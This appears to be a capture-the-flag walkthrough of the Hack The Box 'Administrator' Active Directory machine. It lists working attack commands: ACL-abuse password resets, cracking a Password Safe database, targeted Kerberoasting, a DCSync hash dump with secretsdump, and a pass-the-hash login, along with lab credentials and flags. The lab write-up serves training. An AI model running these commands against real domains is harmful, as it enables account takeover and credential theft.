---
title: "administrator - Hack The Box"
date: 2024-11-09
description: "My walkthrough for administrator machine on HTB."
tags: ["Windows", "Medium", "DCSync", "FTP", "PasswordSafe"]
---

#### Description
```
As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich
```
#### Enumeration
--> First, we start by enumerating the open ports to get a better understanding of the exposed services and overall attack surface :

```shell
sudo nmap -Pn -p- $IP -oN administrator_ports -v 
```

```
Nmap scan report for DC.administrator.htb (10.129.9.225)
Host is up (0.18s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49297/tcp open  unknown
49302/tcp open  unknown
49321/tcp open  unknown
49324/tcp open  unknown
49357/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
50673/tcp open  unknown
```

- The following command extracts only the open ports from the Nmap output and displays them on a single line. I use this approach because I perform Nmap enumeration in two stages: the first scan is used to identify open ports, and the second scan focuses on service enumeration and running the default NSE scripts against those ports.

```shell
grep -oP '^\d+/tcp' administrator_ports | cut -d/ -f1 | paste -sd, -
```

```shell
sudo nmap -Pn -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49297,49302,49321,49324,49357,49664,49665,49666,49667,49668,50673 -A $IP -oN administrator_services -v
```

```
Nmap scan report for DC.administrator.htb (10.129.9.225)
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-10 06:44:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49297/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49302/tcp open  msrpc         Microsoft Windows RPC
49321/tcp open  msrpc         Microsoft Windows RPC
49324/tcp open  msrpc         Microsoft Windows RPC
49357/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50673/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows Server 2012 (91%), Windows Server 2019 (90%), Microsoft Windows 10 1703 (90%), Microsoft Windows 10 1511 (89%), Microsoft Windows 10 1909 (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.132 days (since Wed Dec 10 04:35:28 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-10T06:45:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   114.42 ms 10.10.16.1 (10.10.16.1)
2   56.36 ms  DC.administrator.htb (10.129.9.225)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 10 07:46:00 2025 -- 1 IP address (1 host up) scanned in 81.38 seconds
```

--> In addition to the common domain controller services, there is an **FTP service**.
#### SMB enumeration
--> While waiting for the `nmap` scan to complete, I will start enumerating the `SMB` service using `anonymous/guest authentication`, and then follow up by testing the `provided credentials`.

```shell
nxc smb $IP -u '' -p '' --shares
```

![shares enumeration anon logon](Images/shares%20enumeration%20anon%20logon.png)

```shell
nxc smb $IP -u '' -p '' --users
```

![administrator smb anon login](Images/administrator%20smb%20anon%20login.png)

--> We were unable to retrieve any useful information, which is expected. At this point, I will add `DC.administrator.htb` and `administrator.htb` to my `/etc/hosts` file.

```shell
nxc smb $IP -u '' -p '' --rid 
```

--> We got the following error : `STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.` meaning the `anonymous login` is not authorized to to perform RID enumeration.

--> Now I will use the provided credentials : 

```shell
nxc smb $IP -u 'Olivia' -p 'ichliebedich' --shares
```

![shares enumeration with olivia timeout](Images/shares%20enumeration%20with%20olivia%20timeout.png)

--> I couldn't list shares.

--> Apparently, I had just an error with my VPN connection, after reconnecting to HTB network, I managed to list shares as `Olivia` : 

![Shares as Olivia](Images/Shares%20as%20Olivia.png)

--> These shares are only the default ones, and I couldn’t find anything particularly interesting in them. I also checked the `SYSVOL` share, but it did not contain anything useful.

--> I wanted to get more info about `Olivia` so I run the following command : 

```shell
nxc ldap $IP -u Olivia -p 'ichliebedich' --query "(sAMAccountName=Olivia)" ""
```

![User Olivia via ldap](Images/User%20Olivia%20via%20ldap.png)

--> Since `Olivia` is a member of `Remote Management Users`, I used `Evil-winrm` : 

![Users folders](Images/Users%20folders.png)

--> Although I couldn’t find a `user.txt` file (let’s be honest, you’re not getting that on a medium box with a single command), the directory structure under `C:\Users` clearly indicates that `emily` is the likely target account.

--> I was able to enumerate users via `ldap binding` : 

```shell
nxc ldap $IP -u 'Olivia' -p 'ichliebedich' --users
```

![user enumeration via LDAP binding](Images/user%20enumeration%20via%20LDAP%20binding.png)
#### BloodHound enumeration
--> Now it is time to enumerate `ACLs` : 

```shell
sudo bloodhound-python -u 'olivia' -p 'ichliebedich' -d administrator.htb -ns $IP -c all --zip
```

--> Since we have the credentials for the user `olivia`, I will start enumerating `ACLs` from there. The goal is to check whether this account has any interesting `Outbound Object Control` permissions that could be leveraged for further access or privilege escalation.

![Olivia can change the password of michael](Images/Olivia%20can%20change%20the%20password%20of%20michael.png)

--> We will abuse the `GenericAll` Acl the security principal `Olivia` has on the object `Michael` and change his password :

```shell
net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"olivia"%"ichliebedich" -S administrator.htb
```

--> The user `michael` is a member of the `Remote Management Users` group. After changing his password, we will use `Evil‑WinRM` to log in and see if we can find the `user.txt` flag in his `Desktop` folder (Aight! I knew I wouldn’t find it since earlier there was no folder named `michael`, but I prefer avoiding surprises by missing obvious things).

```shell
evil-winrm -i $IP -u 'michael' -p 'newP@ssword2022'
```

![No user flag in michael folder](Images/No%20user%20flag%20in%20michael%20folder.png)

--> Nothing found.

--> Enumerating shares lead nowhere too.

![michael can change benjamin password](Images/michael%20can%20change%20benjamin%20password.png)

--> We will change the user `Benjamin's` password :

```shell
net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"newP@ssword2022" -S administrator.htb
```

--> When I looked at the user `Properties` in BH, I find out he is a member of `Share Moderators` in addition to the known groups `Users` and `Domain users`. We cannot use `Evil-winrm` or `impacket-psexec` or `impacket-wmiexec`. And also when I inspected if the group `Share Moderators` has any `Outbound Object Control`, I found nothing.

--> Ah Dang! I then remembered that an `FTP service` was exposed. When I tried logging in using `Olivia’s` credentials, I got an authentication error. I then decided to try with the user `Benjamin` and the new password we had set.
--> Since FTP essentially acts as a file share and `Benjamin` is a member of the `Share Moderators` group, this approach made sense to pursue. 😄

![FTP login for benjamin](Images/FTP%20login%20for%20benjamin.png)

--> We will download `Backup.psafe3` using `mget`.

>[!Note]
>A **`.psafe3`** file is the encrypted database used by the Password Safe password manager, meaning it stores all of the saved logins, notes, and related information inside one single file that is fully encrypted. The file can only be opened with the correct master password or key file, and everything inside remains unreadable until that password is provided. Password Safe (`.psafe3`) uses symmetric encryption.

--> In order to open this file, I had to install `Password Safe` :

```shell
sudo apt update && sudo apt install passwordsafe

pwsafe Backup.psafe3
```

![Password Safe](Images/Password%20Safe.png)

--> We will be prompted to enter a `Master Password`.

>[!Note]
>Running `pwsafe2john Backup.psafe3 > backup.hash` extracts the cryptographic data (salt, iterations, checksum, and encrypted payload) needed by John the Ripper to try cracking the **master password** of the Password Safe database;

```shell
pwsafe2john Backup.psafe3 > backup.hash
```

![hash cracked of password safe](Images/hash%20cracked%20of%20password%20safe.png)

--> We will use the cracked value `tekieromucho` as the `Master Password` and we will be able to get the following users' credentials : 

--> `amexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
--> `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
--> `emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur`

--> We know there is a folder in the `C:\Users` called `emily`, we will use her credentials to login via `Evil-winrm` : 

```shell
evil-winrm -i $IP -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![User flag](Images/User%20flag.png)

--> Flag : **{a68df43c9ca08532f2edb88ad7ad43d9}**
#### Shell as administrator
--> Back to BH, the user `emily` has `GenericWrite` on the user `ethan`, so it's time for a `Target keberoasting` : 

![genericwrite on ethan](Images/genericwrite%20on%20ethan.png)

```shell
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user 'ethan'
```

![target keberoast](Images/target%20keberoast.png)

--> We will crack the hash : 

![hash cracked](Images/hash%20cracked.png)

--> Credentials found : `ethan / limpbizkit`

--> From `BH`, the user `ethan` can perform a full **DCSync Attack** as he has `Replicating Directory Changes (GetChanges)`, `Replicating Directory Changes All (GetChangesAll)` and `Replicating Directory Changes in Filtered Set (GetChangesInFilteredSet)`

```shell
impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'
```

![dumping hashes](Images/dumping%20hashes.png)

--> We will use `Evil-winrm` with the hash password of the user `Administrator` : 

```shell
evil-winrm -i $IP -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

![root flag](Images/root%20flag.png)

--> Flag : **{fe9eaa90eca7424784d6ca5f22974082}**

--> Happy Hacking :3

![Happy hacking kitty](Images/Happy%20hacking.png)